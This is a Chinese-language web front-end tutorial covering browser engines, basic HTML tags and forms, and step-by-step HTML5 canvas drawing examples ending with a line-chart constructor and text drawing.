>[success] # 常见的浏览器介绍
<a href="http://tongji.baidu.com/data/browser">浏览器份额</a>
```
浏览器是网页运行的平台，常用的浏览器有IE、火狐（Firefox）、
谷歌（Chrome）、Safari和Opera等。我们平时称为五大浏览器。
```
>[danger] ##### 浏览器内核
```
浏览器内核又可以分成两部分：渲染引擎(layout engineer 或者 Rendering Engine)和 JS 引擎。
渲染引擎 它负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。
JS 引擎 则是解析 Javascript 语言，执行 javascript语言来实现网页的动态效果。

最开始渲染引擎和 JS 引擎并没有区分的很明确，后来 JS 引擎越来越独立，内核就倾向于只指渲染引擎。有一个网页标准计划小组制作了一个 ACID 来测试引擎的兼容性和性能。内核的种类很多，如加上没什么人使用的非商业的免费内核，可能会有10多种，但是常见的浏览器内核可以分这四种：Trident、Gecko、Blink、Webkit。
```
>[danger] ##### 内核代表浏览器
```
1.Trident(IE内核) 代表： IE、傲游、世界之窗浏览器、Avant、腾讯TT、猎
豹安全浏览器、360极速浏览器、百度浏览器等。
2.Gecko(firefox) 代表：Mozilla FireFox(火狐浏览器) 采用该内核
3.webkit(Safari)  代表：傲游浏览器3、 Apple Safari 
(Win/Mac/iPhone/iPad)、Symbian手机浏览器、Android 默认浏览器，
4.Chromium/Bink(chrome)  代表：谷歌
5.Presto(Opera)  代表：opera
```
>[danger] ##### 移动端代表
```
目前移动设备浏览器上常用的内核有 Webkit，Blink，Trident，Gecko 等
，其中 iPhone 和 iPad 等苹果 iOS 平台主要是 WebKit，Android 4.4 之前的 
Android 系统浏览器内核是 WebKit，Android4.4 系统浏览器切换到了
Chromium，内核是 Webkit 的分支 Blink，Windows Phone 8 系统浏览器内
核是 Trident。
```
>[success] # 了解html
* 基本骨架
```
<HTML>   
    <head>     
        <title></title>
    </head>
    <body>
    </body>
</HTML>
```
>[danger] ##### 骨架中存放的内容
```
1.HTML标签:是所有的一个根节点。
2.head标签:用于存放：title(必须有的是网页的标题),meta,base,style,script,link
3.body标签：页面在的主体部分，用于存放所有的HTML标签：
```
>[danger] ##### 文档类型
```
1.<!DOCTYPE html> 生是一个html5的页面
```
>[danger] ##### 字符集
```
<meta charset="UTF-8">
1.utf-8是目前最常用的字符集编码方式，常用的字符集编码方式还有gbk和gb2312。
2.gb2312 简单中文  包括6763个汉字（国标）
3.BIG5   繁体中文 港澳台等用
3.GBK包含全部中文字符是GB2312的扩展，加入对繁体字的支持，兼容GB2312
4.UTF-8则包含全世界所有国家需要用到的字符
```
>[danger] ##### 编写原则
```
1.先确定语义的HTML ，再选合适的CSS。
```
>[success] # 认识路径
```
1.相对路径
2.绝对路径
```
>[danger] ##### 相对路径 -- 相对于当前文件本身查找路径
```
1. 图像文件和HTML文件位于同一文件夹：只需输入图像文件的名称即可，如&lt;img src="logo.gif" /&gt;。
2. 图像文件位于HTML文件的下一级文件夹：输入文件夹名和文件名，之间用“/”隔开，如&lt;img src="img/img01/logo.gif" /&gt;。
3. 图像文件位于HTML文件的上一级文件夹：在文件名之前加入“../” ，如果是上两级，则需要使用 “../ ../”，以此类推，如&lt;img src="../logo.gif" /&gt;。
```
 >[danger] #### 绝对路径
```
1.完整的地址
```
[TOC]
 
>[success] # HTML 标签
```
1.语义是否良好： 当我们去掉CSS之后，网页结构依然组织有序，并且有良好的可读性。
2.不管是谁都能看懂这块内容是什么。
3.遵循的原则：先确定语义的HTML ，再选合适的CSS。
```
>[success] # 排版标签
```
1.排版标签主要和css搭配使用，显示网页结构的标签，是网页布局最常用的标签。
```
```
1.<hn> 标题文本</hn>  --- 作为标题使用，并且依据重要性递减（1-6）
2.<p>文本内容 </p>    --- 作为段落使用，就像写作可以将段落中换行的内容以换行的形式展示
3.<hr />是单标签      --- 在网页中显示默认样式的水平线。
4.<br />是单标签      --- 强制换行文字会从左到右依次排列，直到浏览器窗口的右端，然后自动换行。如果希望某段文本强制换行显示，就需要使用换行标签
5.<div>没有语义的盒子</div>   --- 没有语义的盒子
6.<span>没有语义的盒子</span> --- 没有语义的盒子
```
![](https://box.kancloud.cn/9bbb1707625ce454b3f00408e4aa75d6_788x328.png)
>[success] # 文本标签
```
1.在网页中，有时需要为文字设置粗体、斜体或下划线效果，这时就需要用
到HTML中的文本格式化标签，使文字以特殊的方式显示。
```
```
1.<b>加粗</b> <strong>加粗</strong>  --- 文字加粗推荐 strong 语义化
2.<i>倾斜</i><em>倾斜</em>  --- 文字倾斜推荐em
3.<s>加删除线</s><del>加删除线</del> --- 加删除线推荐del
4.<u>加下划线</u><ins>加下滑线</ins> --- 推荐使用ins
```
>[success] # 图片标签 -- img
```
1.<img/> 是一个单标签 --- 是用来展示图片效果的
```
* img 标签中的属性
![](https://box.kancloud.cn/0e8fbb543567d0bfcd2dfe6209536699_756x253.png)
>[success] # 连接标签 -- a标签
```
1.<a href="跳转目标" target="目标窗口的弹出方式">文本或图像</a>
*href：用于指定链接目标的url地址，当为标签应用href属性时，它就具有了超链接的功能。
*target：用于指定链接页面的打开方式，其取值有_self和_blank两种，其中_self为默认在当前窗口打开，_blank为在新窗口中打开方式。
```
>[danger] ##### 锚点属性
```
1.使用“a href=”#id名>“链接文本"</a>创建链接文本。
2.使用相应的id名标注跳转目标的位置。
```
>[danger] ##### 设置base 控制整个页面a标签是否开启新页面
```
1.base 可以设置整体链接的打开状态   
```
![](https://box.kancloud.cn/65b1dde338fcda567ddafa2ec91eaba3_557x52.png)
>[success] # 列表标签
```
1.无序列表   --<ul><li></li><ul>
2.有序列表   -- <ol><li></li><ol>
3.自定义列表 -- <dl><dt>标题</dt><dd>详细内容</dd></dl>
```
>[danger] #### 应用场景
* ul
![](https://box.kancloud.cn/74151f29c34db628b079294c940f30f0_454x181.png)
* ol
![](https://box.kancloud.cn/26dc085d76653b71969c9594ac859d25_579x106.png)
* dl
![](https://box.kancloud.cn/58d67bc496356e120960c6eff6bddcb8_351x77.png)
>[success] # 表格 -- Table
```
1.数据展示的容器，tr 为行，td为列，th为表头标签，thead用于定义表格的
头部，tbody用于定义表格的头部
2.跨行合并：rowspan    跨列合并：colspan
3.<caption>table的标题属性</caption>
合并单元格的思想：
将多个内容合并的时候，就会有多余的东西，把它删除。例如 把 3个 td 合并成一个， 那就多余了2个，需要删除。
公式：  删除的个数  =  合并的个数  - 1   
<table>
  <tr>
    <td>单元格内的文字</td>
    ...
  </tr>
  ...
</table>
```
* 常见属性
```
1.border -- 做整个table的边框设置
2.cellspacing  -- 设置td 之间的距离
3.cellpadding -- 设置单元格的内边距
4.width -- 设置table 的宽度可以设置百分百
5.height -- 设置table 的高度
6.align --  设置table的位置
<table border="1" cellpadding="5" cellspacing="0" width="100%">
    <tr>
        <td>第一列</td>
        <td>第二列</td>
        <td>第三列</td>
    </tr>
</table>
```
![](https://box.kancloud.cn/7d672fb6ba1ac2b6f7b3fa5a9f142ab1_749x389.png)
>[success] # HTML 的特殊字符
![](https://box.kancloud.cn/d27f9f1ef3bf3c425d0da8e00c3bf383_765x345.png)
>[success] # 表单标签 -- input
```
1.spellcheck="true"  -- 检查单词是否正确
2.当使用checkbox 和 radio 的时候使用name 属性作为一组标记
```
![](https://box.kancloud.cn/d4f65935bb544ab6e3c3f410c2765bb2_774x374.png)
>[danger] ##### label标签
```
1.用于绑定一个表单元素, 当点击label标签的时候, 被绑定的表单元素就会获得输入焦点
```
```
1.label 的for 属性绑定的是 input 的id名称
<label for="male">Male</label>
<input type="radio" name="sex" id="male" value="male">
```
>[danger] ##### 文本域 -- textarea
```
1.如果需要输入大量的信息，就需要用到textarea&gt;标签。通过textarea控件可以轻松地创建多行文本输入框，其基本语法格式如下：
<textarea cols="每行中的字符数" rows="显示的行数">
  文本内容
</textarea>
```
 >[success] # 下拉菜单 -- select
```
1.select -- 下拉菜单
2. <select></select>;中至少应包含一对<option></option>。
3. 在option 中定义selected =" selected "时，当前项即为默认选中项。
```
>[success] # 表单域 -- form
```
1.<form action="url地址" method="提交方式" name="表单名称">
  各种表单控件
</form>
常用属性：
1. Action
   在表单收集到信息后，需要将信息传递给服务器进行处理，action属性用于指定接收并处理表单数据的服务器程序的url地址。
2. method
   用于设置表单数据的提交方式，其取值为get或post。
3. name
   用于指定表单的名称，以区分同一个页面中的多个表单。
注意：  每个表单都应该有自己表单域。
```
>[success] # canvas 绘图步骤
```
1.创建一个画布标签<canvas></canvas>
2.获取画布元素 var myCanvas = document.querySelector('canvas');
3.获取上下文，绘制工具箱  var ctx = myCanvas.getContext('2d');
4.确定画笔的起始点 坐标分别为x，y ctx.moveTo(100,100);
5.绘制线条坐标 ctx.lineTo(200,100);
6.进行描边 ctx.stroke();
```
>[danger] ##### 入门代码
![](https://box.kancloud.cn/b9f1c81969821e140a287ed591633a1e_326x166.png)
```
1.注意控制画布大小的在标签上定义，在style 定义的是内容大小
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas{
            border: 1px solid #ccc;
            /*不建议在 样式设置尺寸*/
            /*width: 600px;
            height: 400px;*/
        }
    </style>
</head>
<body>
<!--1.准备画布-->
<!--1.1 画布是白色的 而且默认300*150-->
<!--1.2 设置画布的大小  width="600" height="400" -->
<canvas width="600" height="400" ></canvas>
<!--2.准备绘制工具-->
<!--3.利用工具绘图-->
<script>
    /*1.获取元素*/
    var myCanvas = document.querySelector('canvas');
    /*2.获取上下文 绘制工具箱 */
    /*是否有3d 暂时没有*/
    var ctx = myCanvas.getContext('2d'); /*web gl 绘制3d效果的网页技术*/
    /*3.移动画笔*/
    ctx.moveTo(100,100);
    /*4.绘制直线 (轨迹，绘制路径)*/
    ctx.lineTo(200,100);
    /*5.描边*/
    ctx.stroke();
</script>
</body>
</html>
```

[TOC]
>[success] # 常用的属性
```
1.画笔起始位置     ctx.moveTo(100,200)
2.画直线定位点     ctx.lineTo(200,200)
3.描边显示直线     ctx.stroke()
4.设置线条颜色	 ctx.strokeStyle=“blue”
5.设置线条粗细     ctx.lineWidth = 10;
6.设置每一个线条独立   ctx.beginPath()
7.填充内部颜色     ctx.fill();
8.设置填充颜色     ctx.fillStyle = 'red';
9.自动闭合线条     ctx.closePath()
10.填充色的顺时逆时针效果
11.线条端点效果   ctx.lineCap = butt/square/round
12.线条折线点效果 ctx.lineJoin = 'miter'/'bevel'/'round'
13.绘制虚线          ctx.setLineDash([20]);
```
>[success] # 绘制平行线
```
1.默认的宽度是多少   1px
2.默认的颜色是什么   黑色
3.产生原因 ：对齐的点是线的中心位置  会把线分成两个0.5px 显示的是会不饱和增加宽度解决方案  前后移动0.5px 
```
>[danger] ##### 案例
![](https://box.kancloud.cn/2ddea8eea8a3872768ce9c9c645bf23d_600x296.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas{
            border:1px solid #cccccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas')
    var ctx = myCanvas.getContext('2d');
    // 实际根据调整的显示效果
    ctx.moveTo(100,100.5)
    ctx.lineTo(200,100.5)

    //没有经过调整的显示效果
    ctx.moveTo(100,200)
    ctx.lineTo(200,200)
    ctx.stroke()
</script>
</body>
</html>
```
>[success] # 带有颜色的三条平行线
```
1.首先声明 ctx.beginPath() 为了告诉三条线相互没有关系，各自描边，不声明代码自上而下最后的会覆盖所有样式
2.设置线条颜色 ctx.strokeStyle=“blue”
3.设置线条宽度 ctx.lineWidth = 10;
4.关闭但前线条用描边  ctx.stroke();
```
>[danger] ##### 案例
![](https://box.kancloud.cn/9e406e4221e533cc5093e9ae55d9084b_604x400.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    /*画平行线*/
    ctx.beginPath();/*Kai*/
    /*蓝色  10px*/
    ctx.moveTo(100,100);
    ctx.lineTo(300,100);
    ctx.strokeStyle = 'blue';
    ctx.lineWidth = 10;
    /*描边*/
    ctx.stroke();


    /*红色 20px*/
    ctx.beginPath();/*Kai*/

    ctx.moveTo(100,200);
    ctx.lineTo(300,200);
    ctx.strokeStyle = 'red';
    ctx.lineWidth = 20;
    /*描边*/
    ctx.stroke();


    /*绿色 30px*/
    ctx.beginPath();/*Kai*/

    ctx.moveTo(100,300);
    ctx.lineTo(300,300);
    ctx.strokeStyle = 'green';
    ctx.lineWidth = 30;
    /*描边*/
    ctx.stroke();


</script>
</body>
</html>
```
>[success] # 绘制三角形
* 第一个描述产生的问题
![](https://box.kancloud.cn/022a9d3c21a63e714796d8bd475a0133_285x194.png)
```
1. 用ctx.lineTo定义三个点坐标，不好的地方是，最后一个点用lineTo和起始点moveTo重合的地方会产生缺口
2. 解决缺口问题自动闭合使用 ctx.closePath();
3. 填充颜色使用ctx.fill();
4. 设置填充颜色默认黑色     ctx.fillStyle = 'red';
```
>[danger] ##### 案例
![](https://box.kancloud.cn/09b03f39272e520c4feb0ee85be771da_262x218.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    /*1.绘制一个三角形*/
    ctx.moveTo(100,100);
    ctx.lineTo(200,100);
    ctx.lineTo(200,200);
    /*起始点和lineTo的结束点无法完全闭合缺角*/
    /*使用canvas的自动闭合 */
   // ctx.lineTo(100,100);
    /*关闭路径*/
    ctx.closePath();

    ctx.lineWidth = 10;
    /*2.描边*/
    ctx.stroke();
    /*3.填充*/
    //ctx.fill();

</script>
</body>
</html>
```
>[success] # 填充色
![](https://box.kancloud.cn/ff10941d70fa12c839001669bf84d42d_741x333.png)

>[danger] ##### 案例
![](https://box.kancloud.cn/5be22b12dad2d3ab7350845dde095bbe_429x403.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas{
            border:1px solid #cccccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas')
    var ctx = myCanvas.getContext('2d');
    /*1.绘制两个正方形 一大200一小100 套在一起*/
    // 顺时针
    ctx.moveTo(100,100);
    ctx.lineTo(300,100);
    ctx.lineTo(300,300);
    ctx.lineTo(100,300);
    ctx.closePath();

    // 逆时针
    ctx.moveTo(150,150);
    ctx.lineTo(150,250);
    ctx.lineTo(250,250);
    ctx.lineTo(250,150);
    ctx.closePath();

    /*2.去填充*/
    //ctx.stroke();
    ctx.fillStyle = 'red';
    ctx.fill();
</script>
</body>
</html>
```
>[success] # 线条两端样式/拐点效果
```
1.设置线两端的ctx.lineCap = butt/square/round 默认无样式/添加一个矩形样式帽子/半圆样式帽子
2.设置折线ctx.lineJoin = 'miter'/'bevel'/'round' 默认无样式/平头样式/半圆样式
```
>[danger] ##### 案例
![](https://box.kancloud.cn/7beddf8027a99e82045516f57dbbd395_545x392.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    /*画平行线*/
    ctx.beginPath();
    ctx.moveTo(100,100);
    ctx.lineTo(200,20);
    ctx.lineTo(300,100);
    ctx.strokeStyle = 'blue';
    ctx.lineWidth = 10;
    ctx.lineCap = 'butt';
    ctx.lineJoin = 'miter';
    ctx.stroke();

    ctx.beginPath();
    ctx.moveTo(100,200);
    ctx.lineTo(200,120);
    ctx.lineTo(300,200);
    ctx.strokeStyle = 'red';
    ctx.lineWidth = 20;
    ctx.lineCap = 'square';
    ctx.lineJoin = 'bevel';
    ctx.stroke();


    ctx.beginPath();
    ctx.moveTo(100,300);
    ctx.lineTo(200,220);
    ctx.lineTo(300,300);
    ctx.strokeStyle = 'green';
    ctx.lineWidth = 30;
    ctx.lineCap = 'round';
    ctx.lineJoin = 'round';
    ctx.stroke();


</script>
</body>
</html>
```
>[success] # 绘制虚线

![](https://box.kancloud.cn/7ba4a3b00ffa3fae73eb5cac1fbd44dc_428x148.png)

>[danger] ##### 案例
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    /*画线*/
    ctx.moveTo(100,100.5);
    ctx.lineTo(300,100.5);
    /*[5,10] 数组是用来描述你的排列方式的*/
    ctx.setLineDash([20]);
    /*获取虚线的排列方式 获取的是不重复的那一段的排列方式*/
    console.log(ctx.getLineDash());

    /*如果是正的值 往后偏移*/
    /*如果是负的值 往前偏移*/
    ctx.lineDashOffset = -20;

    ctx.stroke();

</script>
</body>
</html>
```
>[success] # 绘制从黑到红
![](https://box.kancloud.cn/1c7d89d8794654faa88047b59259e0f6_599x239.png)
```
1.线条的高度就是设置线条的宽度
2.长度+255 rgb的渐变最大值
```
>[danger] ##### 代码
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    ctx.lineWidth = 30;
    for (var i = 0; i < 255; i++) {
        ctx.beginPath();
        ctx.moveTo(100+i-1,100);
        ctx.lineTo(100+i,100);
        ctx.strokeStyle = 'rgb('+i+',0,0)';
        ctx.stroke();
    }

</script>
</body>
</html>
```
[TOC]
>[success] # 制作坐标绘图效果
```
1.先绘制一个表格
2.在绘制坐标轴
```
>[danger] ##### 绘制一个网格
![](https://box.kancloud.cn/b4040cff49526f23536794575ccc2815_680x438.png)
```
1.获取画布宽度             ctx.canvas.width
2.获取画布高度             ctx.canvas.height
3.计算可以x轴网格数         var xLineTotal = Math.floor(canvasHeight / gridSize);
4.计算可以y轴网格数         var yLineTotal = Math.floor(canvasWidth / gridSize);
5.绘制x轴平行的网格，x轴期点是0，y轴的起点是设置线条距离，lineTo设置线条的终点也就是画布的宽，y轴的起点是设置线条距离
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    /*1.绘制网格*/
    /*2.网格的大小*/
    var gridSize = 10;
    var canvasHeight = ctx.canvas.height;
    var canvasWidth = ctx.canvas.width;
    /*3.画多少条X轴方向的线 横线的条数  画布高度*/
    /*var canvasHeight = myCanvas.height;
    var canvasWidth = myCanvas.width;
    console.log(canvasHeight);
    console.log(canvasWidth);*/
    /*console.log(ctx.canvas.width);
    console.log(ctx.canvas.height);*/
    var xLineTotal = Math.floor(canvasHeight / gridSize);
    for (var i = 0; i <= xLineTotal; i++) {
        ctx.beginPath();
        ctx.moveTo(0, i * gridSize - 0.5 );
        ctx.lineTo(canvasWidth, i * gridSize - 0.5);
        ctx.strokeStyle = '#eee';
        ctx.stroke();
    }
    /*4.画多少条Y轴方向的线*/
    var yLineTotal = Math.floor(canvasWidth / gridSize);
    for (var i = 0; i <= yLineTotal; i++) {
        ctx.beginPath();
        ctx.moveTo(i*gridSize - 0.5 ,0);
        ctx.lineTo(i*gridSize - 0.5 ,canvasHeight);
        ctx.strokeStyle = '#eee';
        ctx.stroke();
    }
    /*5.遍历的形式去画*/
</script>
</body>
</html>
```
>[danger] ##### 绘制X/Y 轴
![](https://box.kancloud.cn/782efe23af192a048b37f628a3a69f68_602x394.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas{
            border:1px solid #cccccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    // space控制坐标轴和画布间的距离
    var space=20;
    // 箭头定位点
    var arrowSize = 10;
    // 计算原点
    var canvasWidth = ctx.canvas.width
    var canvasHeight = ctx.canvas.height
    var xO = space
    var yO = canvasHeight - space;

    // 绘制x轴
    ctx.beginPath();
    ctx.moveTo(xO,yO)
    ctx.lineTo(canvasWidth-space,yO)
    // 绘制箭头
    ctx.lineTo(canvasWidth - space - arrowSize, yO + arrowSize / 2);
    ctx.lineTo(canvasWidth - space - arrowSize, yO - arrowSize / 2);
    ctx.lineTo(canvasWidth - space, yO);
    ctx.fill();
    ctx.stroke()

    /*绘制y轴*/
    ctx.beginPath();
    ctx.moveTo(xO, yO);
    ctx.lineTo(space, space);
    /*箭头*/
    ctx.lineTo(space + arrowSize / 2, space + arrowSize);
    ctx.lineTo(space - arrowSize / 2, space + arrowSize);
    ctx.lineTo(space, space);
    ctx.fill();
    ctx.stroke();

</script>
</body>
</html>
```
>[danger] ##### 画坐标点
![](https://box.kancloud.cn/05ccf13672db80921404a2d6aa92d956_327x227.png)
```
1.画一个矩形出来填充
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    /*1.绘制点*/
    /*2.点的尺寸*/
    /*3.以坐标中心绘制点*/

    /*点坐标*/
    var coordinate = {
        x:100,
        y:100
    }
    /*点尺寸*/
    var dottedSize = 10;

    ctx.moveTo(coordinate.x - dottedSize / 2,coordinate.y - dottedSize / 2);
    ctx.lineTo(coordinate.x + dottedSize / 2,coordinate.y - dottedSize / 2);
    ctx.lineTo(coordinate.x + dottedSize / 2,coordinate.y + dottedSize / 2);
    ctx.lineTo(coordinate.x - dottedSize / 2,coordinate.y + dottedSize / 2);
    ctx.closePath();
    ctx.fill();



</script>
</body>
</html>
```
>[success] # 函数封装折线图
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    /*1.构造函数*/
    var LineChart = function (ctx) {
        /*获取绘图工具*/
        this.ctx = ctx || document.querySelector('canvas').getContext('2d');
        /*画布的大小*/
        this.canvasWidth = this.ctx.canvas.width;
        this.canvasHeight = this.ctx.canvas.height;
        /*网格的大小*/
        this.gridSize = 10;
        /*坐标系的间距*/
        this.space = 20;
        /*坐标原点*/
        this.x0 = this.space;
        this.y0 = this.canvasHeight - this.space;
        /*箭头的大小*/
        this.arrowSize = 10;
        /*绘制点*/
        this.dottedSize = 6;
        /*点的坐标 和数据有关系  数据可视化*/
    }
    /*2.行为方法*/
    LineChart.prototype.init = function (data) {
        this.drawGrid();
        this.drawAxis();
        this.drawDotted(data);
    };
    /*绘制网格*/
    LineChart.prototype.drawGrid = function () {
        /*x方向的线*/
        var xLineTotal = Math.floor(this.canvasHeight / this.gridSize);
        this.ctx.strokeStyle = '#eee';
        for (var i = 0; i <= xLineTotal; i++) {
            this.ctx.beginPath();
            this.ctx.moveTo(0, i * this.gridSize - 0.5);
            this.ctx.lineTo(this.canvasWidth, i * this.gridSize - 0.5);
            this.ctx.stroke();
        }
        /*y方向的线*/
        var yLineTotal = Math.floor(this.canvasWidth / this.gridSize);
        for (var i = 0; i <= yLineTotal; i++) {
            this.ctx.beginPath();
            this.ctx.moveTo(i * this.gridSize - 0.5, 0);
            this.ctx.lineTo(i * this.gridSize - 0.5, this.canvasHeight);
            this.ctx.stroke();
        }
    };
    /*绘制坐标系*/
    LineChart.prototype.drawAxis = function () {
        /*X轴*/
        this.ctx.beginPath();
        this.ctx.strokeStyle = '#000';
        this.ctx.moveTo(this.x0, this.y0);
        this.ctx.lineTo(this.canvasWidth - this.space, this.y0);
        this.ctx.lineTo(this.canvasWidth - this.space - this.arrowSize, this.y0 + this.arrowSize / 2);
        this.ctx.lineTo(this.canvasWidth - this.space - this.arrowSize, this.y0 - this.arrowSize / 2);
        this.ctx.lineTo(this.canvasWidth - this.space, this.y0);
        this.ctx.stroke();
        this.ctx.fill();
        /*Y轴*/
        this.ctx.beginPath();
        this.ctx.strokeStyle = '#000';
        this.ctx.moveTo(this.x0, this.y0);
        this.ctx.lineTo(this.space, this.space);
        this.ctx.lineTo(this.space + this.arrowSize / 2, this.space + this.arrowSize);
        this.ctx.lineTo(this.space - this.arrowSize / 2, this.space + this.arrowSize);
        this.ctx.lineTo(this.space, this.space);
        this.ctx.stroke();
        this.ctx.fill();
    };
    /*绘制所有点*/
    LineChart.prototype.drawDotted = function (data) {
        /*1.数据的坐标 需要转换 canvas坐标*/
        /*2.再进行点的绘制*/
        /*3.把线连起来*/
        var that = this;
        /*记录当前坐标*/
        var prevCanvasX = 0;
        var prevCanvasY = 0;
        data.forEach(function (item, i) {
            /* x = 原点的坐标 + 数据的坐标 */
            /* y = 原点的坐标 - 数据的坐标 */
            var canvasX = that.x0 + item.x;
            var canvasY = that.y0 - item.y;
            /*绘制点*/
            that.ctx.beginPath();
            that.ctx.moveTo(canvasX - that.dottedSize / 2, canvasY - that.dottedSize / 2);
            that.ctx.lineTo(canvasX + that.dottedSize / 2, canvasY - that.dottedSize / 2);
            that.ctx.lineTo(canvasX + that.dottedSize / 2, canvasY + that.dottedSize / 2);
            that.ctx.lineTo(canvasX - that.dottedSize / 2, canvasY + that.dottedSize / 2);
            that.ctx.closePath();
            that.ctx.fill();
            /*点的连线*/
            /*当时第一个点的时候 起点是 x0 y0*/
            /*当时不是第一个点的时候 起点是 上一个点*/
            if(i == 0){
                that.ctx.beginPath();
                that.ctx.moveTo(that.x0,that.y0);
                that.ctx.lineTo(canvasX,canvasY);
                that.ctx.stroke();
            }else{
                /*上一个点*/
                that.ctx.beginPath();
                that.ctx.moveTo(prevCanvasX,prevCanvasY);
                that.ctx.lineTo(canvasX,canvasY);
                that.ctx.stroke();
            }
            /*记录当前的坐标，下一次要用*/
            prevCanvasX = canvasX;
            prevCanvasY = canvasY;
        });
    };
    /*3.初始化*/
    var data = [
        {
            x: 100,
            y: 120
        },
        {
            x: 200,
            y: 160
        },
        {
            x: 300,
            y: 240
        },
        {
            x: 400,
            y: 120
        },
        {
            x: 500,
            y: 80
        }
    ];
    var lineChart = new LineChart();
    lineChart.init(data);
</script>
</body>
</html>
```
[TOC]
>[success] # 绘制矩形效果
```
1.ctx.rect(100,100,200,100);  // 坐标起点的x轴,y轴，矩形宽度和高度，会被覆盖，值得是有没beginPath效果
2.ctx.strokeRect(100,100,200,100); // 有beginPath 效果但不能填充只有线展示效果
3.ctx.fillRect(100,100,200,100);  // 有beginPath 效果但能填充
4.ctx.clearRect(0,0,ctx.canvas.width,ctx.canvas.height); 清除矩形的内容
5.ctx.createLinearGradient(100,100,500,400); // x0y0 起始点 x1y1 结束点  确定长度和方向
   linearGradient.addColorStop(0,'pink');
   linearGradient.addColorStop(1,'blue');
```
>[danger] ##### 绘制矩形案例
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    /*绘制矩形路径 不是独立路径*/
    /*ctx.rect(100,100,200,100);
    ctx.fillStyle = 'green';
    ctx.stroke();
    ctx.fill();*/

    /*绘制矩形  有自己的独立路径*/
    //ctx.strokeRect(100,100,200,100);
    ctx.fillRect(100,100,200,100);

    /*清除矩形的内容*/
    ctx.clearRect(0,0,ctx.canvas.width,ctx.canvas.height);

    //ctx.fillRect(100,100,200,100);

</script>
</body>
</html>
```
>[danger] ##### 矩形渐变
![](https://box.kancloud.cn/2e634bafe1cb7542e0bd646a7ef1de2f_568x203.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas{
            border:1px solid #cccccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    /**1.创建一个createLinearGradient 颜色渐变四个参数是，起始点x，y终点的x，y
     * 2.声明渐变色和渐变的百分比addColorStop
     * 3.把创建的createLinearGradient 对象赋值给fillStyle
     * **/
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');
    // 矩形右上角 坐标
    var linearGradient = ctx.createLinearGradient(100,100,500,100);
    linearGradient.addColorStop(0,'pink')
    //linearGradient.addColorStop(0.5,'red');
    linearGradient.addColorStop(1,'blue')
    ctx.fillStyle = linearGradient
    ctx.fillRect(100,100,400,100);
    /*pink---->blue*/
    /*回想线性渐变---->要素 方向  起始颜色 结束颜色 */
    /*通过两个点的坐标可以控制 渐变方向*/


</script>
</body>
</html>
```
>[success] # 绘制字体
```
1.ctx.font = '微软雅黑' 设置字体
2.strokeText()
3.fillText(text,x,y,maxWidth)
   text 要绘制的文本
   x,y 文本绘制的坐标（文本左下角）
